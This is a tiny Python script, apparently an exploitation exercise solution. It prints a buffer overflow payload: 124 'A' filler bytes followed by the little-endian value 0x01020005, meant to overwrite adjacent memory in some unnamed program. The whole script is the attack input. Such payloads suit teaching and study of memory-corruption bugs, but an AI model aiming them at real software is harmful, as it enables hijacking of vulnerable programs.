import sys 

sys.stdout.buffer.write(b'A' * 124 + b'\x05\x00\x02\x01\n')

